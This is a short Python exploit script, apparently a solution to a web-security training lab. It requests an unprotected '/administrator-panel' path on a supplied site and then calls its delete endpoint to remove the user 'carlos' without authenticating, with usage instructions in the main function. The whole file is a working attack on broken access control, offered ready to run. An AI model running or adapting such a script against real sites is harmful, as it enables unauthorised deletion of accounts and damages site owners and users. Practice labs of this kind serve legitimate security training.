import requests
import sys

def delete_user(url):
    admin_panel = url + "/administrator-panel"
    response = requests.get(admin_panel)
    print("(+) Finding the admin panel...")
    if response.status_code == 200:
        print("(+) Admin panel Found!")
        delete_user = url + "/administrator-panel/delete?username=carlos"
        print("(+) Deleting user Carlos...")
        response = requests.get(delete_user)
        if response.status_code == 200:
            print("(+) User Carlos deleted successfully!")
        else:
            print("(-) Something went wrong! Couldn't delete user Carlos.")
    else:
        print("(-) Could not found admin panel.")
        print("(-) Exiting the script...")

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: python3 %s website" % sys.argv[0])
        print("(+) Example: python3 %s www.example.com" % sys.argv[0])
        sys.exit(1)

    else:
        print("(+) Executing the script...")
        url = sys.argv[1]
        delete_user(url)

if __name__ == "__main__":
    main()
